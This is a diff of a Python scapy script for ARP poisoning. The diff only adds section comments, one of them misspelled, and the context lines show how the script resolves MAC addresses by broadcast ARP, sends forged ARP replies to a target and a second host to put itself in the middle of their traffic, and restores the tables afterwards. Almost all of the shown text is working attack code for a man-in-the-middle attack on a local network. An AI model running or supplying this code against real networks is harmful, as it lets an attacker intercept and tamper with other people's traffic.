@@ -2,6 +2,7 @@ import scapy.all as scapy
 from optparse import OptionParser
 import time
 
+#User Inputs
 def inputs():
     value = OptionParser()
     value.add_option("-t","--target",dest="target",help="This is your attack IP")
@@ -12,6 +13,7 @@ def inputs():
     else:
         print("You have to enter an IP or range IP")
 
+#Mac Adress
 def get_mac(IP):
     ip_packet = scapy.ARP(pdst=IP)
     mac_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -20,7 +22,7 @@ def get_mac(IP):
     return answer[0][1].hwsrc # ["8","0".."0","1"] şeklinde yazamamsı için liste içinden çıkardım.
 
 
-
+#Arp Poison
 def arp_poison(target,range):
     target_mac = get_mac(target)
     range_mac = get_mac(range)
@@ -31,6 +33,7 @@ def arp_poison(target,range):
     scapy.send(poison_range_packet,verbose=False)
     scapy.send(poison_target_packet,verbose=False)
 
+#Restart Arp Poison
 def unarp_poison(target,range):
     target_mac = get_mac(target)
     range_mac = get_mac(range)
